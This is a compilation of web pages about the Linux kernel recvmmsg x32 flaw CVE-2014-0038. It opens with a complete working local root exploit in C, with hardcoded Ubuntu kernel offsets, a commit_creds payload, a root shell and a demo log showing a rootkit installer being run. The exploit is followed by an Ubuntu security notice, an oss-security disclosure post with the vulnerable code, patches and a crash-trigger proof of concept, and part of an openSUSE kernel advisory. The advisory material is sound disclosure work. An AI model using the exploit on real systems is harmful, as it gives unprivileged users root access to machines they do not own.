CVE-2014-0038 / x32 ABI with recvmmsg
by rebel @ irc.smashthestack.org
-----------------------------------
takes about 13 minutes to run because timeout->tv\_sec is decremented
once per second and 0xff\*3 is 765.
some things you could do while waiting:
\* watch http://www.youtube.com/watch?v=OPyZGCKu2wg 3 times
\* read https://wiki.ubuntu.com/Security/Features and smirk a few times
\* brew some coffee
\* stare at the countdown giggly with anticipation
could probably whack the high bits of some pointer with nanoseconds,
but that would require a bunch of nulls before the pointer and then
reading an oops from dmesg which isn't that elegant.
&net\_sysctl\_root.permissions is nice because it has 16 trailing nullbytes
hardcoded offsets because I only saw this on ubuntu & kallsyms is protected
anyway..
same principle will work on 32bit but I didn't really find any major
distros shipping with CONFIG\_X86\_X32=y
user@ubuntu:~$ uname -a
Linux ubuntu 3.11.0-15-generic #23-Ubuntu SMP Mon Dec 9 18:17:04 UTC 2013 x86\_64 x86\_64 x86\_64 GNU/Linux
user@ubuntu:~$ gcc recvmmsg.c -o recvmmsg
user@ubuntu:~$ ./recvmmsg
byte 3 / 3.. ~0 secs left.
w00p w00p!
# id
uid=0(root) gid=0(root) groups=0(root)
# sh phalanx-2.6b-x86\_64.sh
unpacking..
:)=
greets to my homeboys kaliman, beist, capsl & all of #social
Sat Feb 1 22:15:19 CET 2014
% rebel %
\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*=\*
\*/
#define \_GNU\_SOURCE
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#define \_\_X32\_SYSCALL\_BIT 0x40000000
#undef \_\_NR\_recvmmsg
#define \_\_NR\_recvmmsg (\_\_X32\_SYSCALL\_BIT + 537)
#define VLEN 1
#define BUFSIZE 200
int port;
struct offset {
char \*kernel\_version;
unsigned long dest; // net\_sysctl\_root + 96
unsigned long original\_value; // net\_ctl\_permissions
unsigned long prepare\_kernel\_cred;
unsigned long commit\_creds;
};
struct offset offsets[] = {
{"3.11.0-15-generic",0xffffffff81cdf400+96,0xffffffff816d4ff0,0xffffffff8108afb0,0xffffffff8108ace0}, // Ubuntu 13.10
{"3.11.0-12-generic",0xffffffff81cdf3a0,0xffffffff816d32a0,0xffffffff8108b010,0xffffffff8108ad40}, // Ubuntu 13.10
{"3.8.0-19-generic",0xffffffff81cc7940,0xffffffff816a7f40,0xffffffff810847c0, 0xffffffff81084500}, // Ubuntu 13.04
{NULL,0,0,0,0}
};
void udp(int b) {
int sockfd;
struct sockaddr\_in servaddr,cliaddr;
int s = 0xff+1;
if(fork() == 0) {
while(s > 0) {
fprintf(stderr,"\rbyte %d / 3.. ~%d secs left \b\b\b\b",b+1,3\*0xff - b\*0xff - (0xff+1-s));
sleep(1);
s--;
fprintf(stderr,".");
}
sockfd = socket(AF\_INET,SOCK\_DGRAM,0);
bzero(&servaddr,sizeof(servaddr));
servaddr.sin\_family = AF\_INET;
servaddr.sin\_addr.s\_addr=htonl(INADDR\_LOOPBACK);
servaddr.sin\_port=htons(port);
sendto(sockfd,"1",1,0,(struct sockaddr \*)&servaddr,sizeof(servaddr));
exit(0);
}
}
void trigger() {
open("/proc/sys/net/core/somaxconn",O\_RDONLY);
if(getuid() != 0) {
fprintf(stderr,"not root, ya blew it!\n");
exit(-1);
}
fprintf(stderr,"w00p w00p!\n");
system("/bin/sh -i");
}
typedef int \_\_attribute\_\_((regparm(3))) (\* \_commit\_creds)(unsigned long cred);
typedef unsigned long \_\_attribute\_\_((regparm(3))) (\* \_prepare\_kernel\_cred)(unsigned long cred);
\_commit\_creds commit\_creds;
\_prepare\_kernel\_cred prepare\_kernel\_cred;
// thx bliss
static int \_\_attribute\_\_((regparm(3)))
getroot(void \*head, void \* table)
{
commit\_creds(prepare\_kernel\_cred(0));
return -1;
}
void \_\_attribute\_\_((regparm(3)))
trampoline()
{
asm("mov $getroot, %rax; call \*%rax;");
}
int main(void)
{
int sockfd, retval, i;
struct sockaddr\_in sa;
struct mmsghdr msgs[VLEN];
struct iovec iovecs[VLEN];
char buf[BUFSIZE];
long mmapped;
struct utsname u;
struct offset \*off = NULL;
uname(&u);
for(i=0;offsets[i].kernel\_version != NULL;i++) {
if(!strcmp(offsets[i].kernel\_version,u.release)) {
off = &offsets[i];
break;
}
}
if(!off) {
fprintf(stderr,"no offsets for this kernel version..\n");
exit(-1);
}
mmapped = (off->original\_value & ~(sysconf(\_SC\_PAGE\_SIZE) - 1));
mmapped &= 0x000000ffffffffff;
srand(time(NULL));
port = (rand() % 30000)+1500;
commit\_creds = (\_commit\_creds)off->commit\_creds;
prepare\_kernel\_cred = (\_prepare\_kernel\_cred)off->prepare\_kernel\_cred;
mmapped = (long)mmap((void \*)mmapped, sysconf(\_SC\_PAGE\_SIZE)\*3, PROT\_READ|PROT\_WRITE|PROT\_EXEC, MAP\_PRIVATE|MAP\_ANONYMOUS|MAP\_FIXED, 0, 0);
if(mmapped == -1) {
perror("mmap()");
exit(-1);
}
memset((char \*)mmapped,0x90,sysconf(\_SC\_PAGE\_SIZE)\*3);
memcpy((char \*)mmapped + sysconf(\_SC\_PAGE\_SIZE), (char \*)&trampoline, 300);
if(mprotect((void \*)mmapped, sysconf(\_SC\_PAGE\_SIZE)\*3, PROT\_READ|PROT\_EXEC) != 0) {
perror("mprotect()");
exit(-1);
}
sockfd = socket(AF\_INET, SOCK\_DGRAM, 0);
if (sockfd == -1) {
perror("socket()");
exit(-1);
}
sa.sin\_family = AF\_INET;
sa.sin\_addr.s\_addr = htonl(INADDR\_LOOPBACK);
sa.sin\_port = htons(port);
if (bind(sockfd, (struct sockaddr \*) &sa, sizeof(sa)) == -1) {
perror("bind()");
exit(-1);
}
memset(msgs, 0, sizeof(msgs));
iovecs[0].iov\_base = &buf
iovecs[0].iov\_len = BUFSIZE;
msgs[0].msg\_hdr.msg\_iov = &iovecs[0];
msgs[0].msg\_hdr.msg\_iovlen = 1;
for(i=0;i < 3 ;i++) {
udp(i);
retval = syscall(\_\_NR\_recvmmsg, sockfd, msgs, VLEN, 0, (void \*)off->dest+7-i);
if(!retval) {
fprintf(stderr,"\nrecvmmsg() failed\n");
}
}
close(sockfd);
fprintf(stderr,"\n");
trigger();
}

=== Content from bugzilla.novell.com_ef481a20_20250126_034940.html ===




=== Content from bugzilla.novell.com_26178b94_20250126_034943.html ===




=== Content from www.ubuntu.com_9164bad8_20250124_220420.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-2096-1: Linux kernel vulnerability

31 January 2014

The system could be made to crash or run programs as an administrator.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 13.10](/security/notices?release=saucy)

## Packages

* [linux](/security/cves?package=linux) - Linux kernel

## Details

Pageexec reported a bug in the Linux kernel's recvmmsg syscall when called

from code using the x32 ABI. An unprivileged local user could exploit this

flaw to cause a denial of service (system crash) or gain administrator

privileges.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 13.10

* [linux-image-3.11.0-15-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [3.11.0-15.25](https://launchpad.net/ubuntu/%2Bsource/linux/3.11.0-15.25)
* [linux-image-3.11.0-15-generic](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [3.11.0-15.25](https://launchpad.net/ubuntu/%2Bsource/linux/3.11.0-15.25)

After a standard system update you need to reboot your computer to make

all the necessary changes.

## References

* [CVE-2014-0038](/security/CVE-2014-0038)

## Related notices

* [USN-2095-1](/security/notices/USN-2095-1)
* [USN-2094-1](/security/notices/USN-2094-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from www.openwall.com_0044d8cc_20250124_220344.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20140131001116.GA16906@openwall.com>
Date: Fri, 31 Jan 2014 04:11:16 +0400
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Linux 3.4+: arbitrary write with CONFIG_X86_X32 (CVE-2014-0038)

Hi,

This issue was brought to linux-distros and security@k.o 2 days ago via
the message quoted below, and it was just made public at 22:00 UTC today
(two hours ago) via grsecurity and PaX (who were the ones to find the
issue).  Normally, the person who brought this to linux-distros would be
the one responsible to bring the issue to oss-security as soon as the
issue is public, but Kees does not appear to be around at the moment and
the issue is critical enough that I find it inappropriate to delay this
posting by a few hours more, hence I am doing Kees' job by posting this
in here.

This is CVE-2014-0038 (assigned shortly after Kees sent the message
below).  I will also include PaX Team's revised patch below.

----- Forwarded message from Kees Cook <keescook@...omium.org> -----

From: Kees Cook <keescook@...omium.org>
Subject: 3.4+: arbitrary write with CONFIG_X86_X32
Date: Tue, 28 Jan 2014 15:52:58 -0800

This appears to be a serious bug, so I'd like to make sure distros
have time to prepare updates but PaX Team really wants to get this
fixes ASAP. When is the soonest Coordinated Release Date distros can
handle?

(I have no CVE assigned for this since I'm still waiting for my 2014
allocation.)

Reported by pageexec at
<https://code.google.com/p/chromium/issues/detail?id=338594>, which is
restricted, so here's the full report:
----
asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,
                                    unsigned int vlen, unsigned int flags,
                                    struct compat_timespec __user *timeout)
{
        int datagrams;
        struct timespec ktspec;

        if (flags & MSG_CMSG_COMPAT)
                return -EINVAL;

        if (COMPAT_USE_64BIT_TIME)
                return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
                                      flags | MSG_CMSG_COMPAT,
                                      (struct timespec *) timeout);
/*...*/

The timeout pointer parameter is provided by userland (hence the
__user annotation) but for x32 syscalls it's simply cast to a kernel
pointer and is passed to __sys_recvmmsg which will eventually directly
dereference it for both reading and writing. Other callers to
__sys_recvmmsg properly copy from userland to the kernel first.

The impact is a sort of arbitrary kernel write-where-what primitive by
unprivileged users where the to-be-written area must contain valid
timespec data initially (the first 64 bit long field must be positive
and the second one must be < 1G).

The bug was introduced by commit
<http://git.kernel.org/linus/ee4fa23c4b> (other uses of
COMPAT_USE_64BIT_TIME seem fine) and should affect all kernels since
3.4 (and perhaps vendor kernels if they backported x32 support along
with this code). Note that CONFIG_X86_X32_ABI gets enabled at build
time and only if CONFIG_X86_X32 is enabled and ld can build x32
executables.

Suggested fix:
Signed-off-by: PaX Team <pageexec@...email.hu>

--- a/net/compat.c  2014-01-20 12:36:54.372997752 +0100
+++ b/net/compat.c      2014-01-28 02:06:59.265506171 +0100
@@ -780,22 +780,25 @@
        if (flags & MSG_CMSG_COMPAT)
                return -EINVAL;

-       if (COMPAT_USE_64BIT_TIME)
-               return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
-                                     flags | MSG_CMSG_COMPAT,
-                                     (struct timespec *) timeout);
-
        if (timeout == NULL)
                return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
                                      flags | MSG_CMSG_COMPAT, NULL);

-       if (get_compat_timespec(&ktspec, timeout))
+       if (COMPAT_USE_64BIT_TIME) {
+               if (copy_from_user(&ktspec, timeout, sizeof(ktspec)))
+                       return -EFAULT;
+       } else if (get_compat_timespec(&ktspec, timeout))
                return -EFAULT;

        datagrams = __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
                                   flags | MSG_CMSG_COMPAT, &ktspec);
-       if (datagrams > 0 && put_compat_timespec(&ktspec, timeout))
-               datagrams = -EFAULT;
+       if (datagrams > 0) {
+               if (COMPAT_USE_64BIT_TIME) {
+                       if (copy_to_user(timeout, &ktspec, sizeof(ktspec)))
+                               datagrams = -EFAULT;
+               } else if (put_compat_timespec(&ktspec, timeout))
+                       datagrams = -EFAULT;
+       }

        return datagrams;
 }

So I couldn't help it and created a simple PoC trigger based on the
example in the manpage. As it is, it'll just trigger a null-deref oops
on the read side:

BUG: unable to handle kernel NULL pointer dereference at 0000000000000009
IP: [<ffffffff82a333cb>] __sys_recvmmsg+0x3b/0x310

By passing an appropriate value for the timeout pointer one can
trigger the write side too. By the way, this also allows scanning the
kernel address space and even reveal KASLR (try every 2MB, if no oops
-> found the kernel), no doubt to Kees' delight :).

/*
 * PoC trigger for the linux 3.4+ recvmmsg x32 compat bug, based on the manpage
 *
 * <https://code.google.com/p/chromium/issues/detail?id=338594>
 *
 * $ while true; do echo $RANDOM > /dev/udp/127.0.0.1/1234; sleep 0.25; done
 */

#define _GNU_SOURCE
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/syscall.h>

#define __X32_SYSCALL_BIT 0x40000000
#undef __NR_recvmmsg
#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)

int
main(void)
{
#define VLEN 10
#define BUFSIZE 200
#define TIMEOUT 1
    int sockfd, retval, i;
    struct sockaddr_in sa;
    struct mmsghdr msgs[VLEN];
    struct iovec iovecs[VLEN];
    char bufs[VLEN][BUFSIZE+1];
    struct timespec timeout;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port = htons(1234);
    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
        perror("bind()");
        exit(EXIT_FAILURE);
    }

    memset(msgs, 0, sizeof(msgs));
    for (i = 0; i < VLEN; i++) {
        iovecs[i].iov_base         = bufs[i];
        iovecs[i].iov_len          = BUFSIZE;
        msgs[i].msg_hdr.msg_iov    = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    timeout.tv_sec = TIMEOUT;
    timeout.tv_nsec = 0;

//    retval = recvmmsg(sockfd, msgs, VLEN, 0, &timeout);
//    retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, &timeout);
    retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, (void *)1ul);
    if (retval == -1) {
        perror("recvmmsg()");
        exit(EXIT_FAILURE);
    }

    printf("%d messages received\n", retval);
    for (i = 0; i < retval; i++) {
        bufs[i][msgs[i].msg_len] = 0;
        printf("%d %s", i+1, bufs[i]);
    }
    exit(EXIT_SUCCESS);
}
----

-Kees

--
Kees Cook
Chrome OS Security

----- End forwarded message -----

----- Forwarded message from PaX Team <pageexec@...email.hu> -----

From: "PaX Team" <pageexec@...email.hu>
Subject: Re: 3.4+: arbitrary write with CONFIG_X86_X32
Date: Thu, 30 Jan 2014 14:45:53 +0100

On 30 Jan 2014 at 14:24, security@...nel.org wrote:

> On 29 Jan 2014 at 20:06, H. Peter Anvin wrote:
>
> > Longer term we may want to do something fancier with
> > get_compat_timespec() and put_compat_timespec() to encapsulate
> > COMPAT_USE_64BIT_TIME, but this is not the time.
>
> Yeah, I didn't go that route because these functions have a dozen
> other callers (including gems like compat_get_timespec calling
> get_compat_timespec where the former does treat x32) and I didn't
> want to find out if all of them would need the x32 treatment when
> fixing this bug is much more urgent.

Actually, I think we can use compat_*_timespec here as I effectively
ended up open coding them, so here's the new and simpler patch:

Signed-off-by: PaX Team <pageexec@...email.hu>

--- a/net/compat.c	2014-01-20 12:36:54.372997752 +0100
+++ b/net/compat.c	2014-01-30 14:29:15.385082301 +0100
@@ -780,21 +780,16 @@
 	if (flags & MSG_CMSG_COMPAT)
 		return -EINVAL;

-	if (COMPAT_USE_64BIT_TIME)
-		return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
-				      flags | MSG_CMSG_COMPAT,
-				      (struct timespec *) timeout);
-
 	if (timeout == NULL)
 		return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
 				      flags | MSG_CMSG_COMPAT, NULL);

-	if (get_compat_timespec(&ktspec, timeout))
+	if (compat_get_timespec(&ktspec, timeout))
 		return -EFAULT;

 	datagrams = __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
 				   flags | MSG_CMSG_COMPAT, &ktspec);
-	if (datagrams > 0 && put_compat_timespec(&ktspec, timeout))
+	if (datagrams > 0 && compat_put_timespec(&ktspec, timeout))
 		datagrams = -EFAULT;

 	return datagrams;

----- End forwarded message -----

Both patches were Acked-by: H. Peter Anvin <hpa@...ux.intel.com> (when
each was the current patch), and I guess the newer patch (from the
second forwarded message above) is preferable (the one I expect to see
committed soon).

It appears, from the linux-distros discussion, that a couple of distros
are going to release emergency security updates for this.  If they did
not express interest in an extra day of embargo, the issue would likely
be made public on the first day (not on the second).

In one of the messages on linux-distros, I commented on whether using
the list for an issue like this was even appropriate, as follows:

"BTW, if this were not limited to x32, I'd say that posting the info
directly to linux-distros (rather than e.g. posting a "please contact me
for details if affected and need more detail") would be inappropriate,
because it's a high impact bug, whereas this list is for medium overall
severity issues:

<http://oss-security.openwall.org/wiki/mailing-lists/distros>

"To report a non-public medium severity 1) security issue to one of
these lists, send e-mail to distros [at] ..."

"1) Medium overall severity as estimated by risk probability and risk
impact product.  It is recommended that low severity security issues be
reported to the public oss-security list right away, whereas high
severity ones be reported to the affected vendors directly."

It's the x32 aspect that reduces the overall severity in this case."

Arbitrary selection of additional detail/commentary, from Twitter:

During the first day (of two) of embargo of this vuln:

<grsecurity> My hatred for embargoes and vendor-sec-like lists cannot be adequately expressed

Right after the coordinated disclosure date/time (today):

<grsecurity> If you're running Linux 3.4 or newer and enabled CONFIG_X86_X32 , you need to disable it or update immediately; upstream vuln CVE-2014-0038
<grsecurity> It doesn't get any more serious, nearly an arbitrary write which nothing (including grsecurity) will prevent exploitation of
<grsecurity> To give you an idea of the level of testing that went into X32 support, a syscall fuzzer trying random syscall numbers could have found this
<grsecurity> Yet it sat in the kernel for over a year and a half
<grsecurity> I would not be surprised to see an exploit for this within the next few days
<@grsecurity> @awasi1001 Our latest test patch uploaded today contains the fix.  The stable 3.2 tree is not affected.

<grsecurity> In case there's confusion, this vuln is not about 32bit userland on 64bit (CONFIG_X86_32), but the new X32 ABI.  Ubuntu enables it recently

<djrbliss> Seems the X32 privesc (CVE-2014-0038) was introduced in the final five lines of this commit: <http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/net/compat.c?id=ee4fa23c4bfcc635d077a9633d405610de45bc70>

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugzilla.novell.com_9eed212d_20250126_034938.html ===




=== Content from lists.opensuse.org_75a20d85_20250124_220334.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/LVUAZOUKQZFEYUPQYU5QOR2Y3GSESDMA/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/LVUAZOUKQZFEYUPQYU5QOR2Y3GSESDMA/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/LVUAZOUKQZFEYUPQYU5QOR2Y3GSESDMA/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/LVUAZOUKQZFEYUPQYU5QOR2Y3GSESDMA/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/LVUAZOUKQZFEYUPQYU5QOR2Y3GSESDMA/#LVUAZOUKQZFEYUPQYU5QOR2Y3GSESDMA)

# [security-announce] openSUSE-SU-2014:0204-1: important: kernel: security and bugfix update

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

6 Feb
2014

6 Feb
'14

18:04

openSUSE Security Update: kernel: security and bugfix update
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2014:0204-1
Rating: important
References: #804950 #805226 #808358 #811746 #825006 #831836
#838024 #840226 #840656 #844513 #848079 #848255
#849021 #849023 #849029 #849034 #849362 #852373
#852558 #852559 #853050 #853051 #853052 #853053
#854173 #854634 #854722 #860993
Cross-References: CVE-2013-0343 CVE-2013-1792 CVE-2013-4348
CVE-2013-4511 CVE-2013-4513 CVE-2013-4514
CVE-2013-4515 CVE-2013-4587 CVE-2013-6367
CVE-2013-6368 CVE-2013-6376 CVE-2013-6378
CVE-2013-6380 CVE-2013-6431 CVE-2013-7027
CVE-2014-0038
Affected Products:
openSUSE 12.3
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that solves 16 vulnerabilities and has 12 fixes
is now available.
Description:
The Linux kernel was updated to fix various bugs and
security issues:
- mm/page-writeback.c: do not count anon pages as dirtyable
memory (reclaim stalls).
- mm/page-writeback.c: fix dirty\_balance\_reserve
subtraction from dirtyable memory (reclaim stalls).
- compat\_sys\_recvmmsg X32 fix (bnc#860993 CVE-2014-0038).
- hwmon: (coretemp) Fix truncated name of alarm attributes
- net: fib: fib6\_add: fix potential NULL pointer
